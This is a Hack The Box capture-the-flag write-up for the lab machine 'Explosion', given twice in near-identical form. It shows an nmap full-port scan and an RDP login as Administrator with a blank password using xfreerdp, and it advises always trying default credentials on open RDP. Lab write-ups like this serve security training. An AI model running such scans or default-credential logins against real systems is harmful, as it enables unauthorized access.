# Machine Name : Explosion
## Platform : HackTheBox
### Difficulty : Easy
----------------------------------------------------------------------------------------------------------
# Enumeration

Running a full TCP scan - 

```bash
nmap -p- -T4 -min-rate=10000 10.129.1.13 -Pn -vv 
```
It gave away these open ports -

```bash
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
5985/tcp  open  wsman         syn-ack ttl 127
47001/tcp open  winrm         syn-ack ttl 127
```

We see that ms-wbt-server is active , basically a RDP. Its a good practice to check if we can access the RDP with deault username (Administrator) without any password.

```bash
sudo xfreerdp3 /u:Administrator /p: /v:10.129.1.13
```

And we got logged in !. The flag was right on the Desktop. Main point of the machine was to develop an instint to try to login in to RDP protocol without any password.

Explosion has been PWNED !!
----------------------------------------------------------------------------------------------------------

# 💥 Machine Name: Explosion  
## 💻 Platform: Hack The Box  
### 🎯 Difficulty: Easy  
---

## 🔍 Enumeration

We start with a full TCP port scan to identify all open ports:

```bash
nmap -p- -T4 --min-rate=10000 -Pn -vv 10.129.1.13
```

🔎 Open Ports:
```
135/tcp    open  msrpc
139/tcp    open  netbios-ssn
445/tcp    open  microsoft-ds
3389/tcp   open  ms-wbt-server   (RDP)
5985/tcp   open  wsman
47001/tcp  open  winrm
```

The presence of 3389 (RDP) indicates that Remote Desktop Protocol is active. It’s a good idea to test if we can connect using default credentials (often without a password).
----------------------------------------------------------------------------------------------------------
🚪 Exploitation - RDP Login

We try accessing RDP as the Administrator user with a blank password:

```sudo xfreerdp /u:Administrator /p: /v:10.129.1.13
```

✅ Success! We were able to log in without a password.

🎯 Privilege & Flag

After logging in via RDP, navigate to the Desktop — the flag is right there.

***Always try default credentials when RDP (port 3389) is open.
In this case, simply logging in as Administrator with a blank password gave full access. This highlights the importance of checking for misconfigurations or weak credentials before diving into complex exploitation.